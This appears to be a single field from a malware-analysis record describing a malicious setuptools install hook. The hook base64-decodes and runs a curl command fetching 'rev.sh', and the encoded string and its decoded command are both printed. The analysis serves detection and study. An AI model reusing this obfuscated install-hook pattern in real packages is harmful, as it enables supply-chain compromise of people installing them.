      "malicious_behavior": "The code defines a setuptools installation hook that executes a shell command during the package installation process without user interaction or consent. Specifically, the function 'notmalfunc' decodes a base64-encoded string 'Y3VybCBodHRwOi8vbG9jYWxob3N0L3Jldi5zaAo=' which translates to 'curl http://localhost/rev.sh\\n' and immediately passes it to os.system for execution. This means that during installation, the package will run a curl command to fetch and execute a script from a remote URL (localhost in this example, but this pattern is typical for remote code execution). The use of base64 encoding to hide the command, execution of shell commands during install, and automatic execution without user consent are strong indicators of malicious behavior. This pattern is a classic supply chain attack vector where arbitrary code is executed on the victim's machine during package installation, potentially leading to remote code execution, system compromise, or further payload delivery."
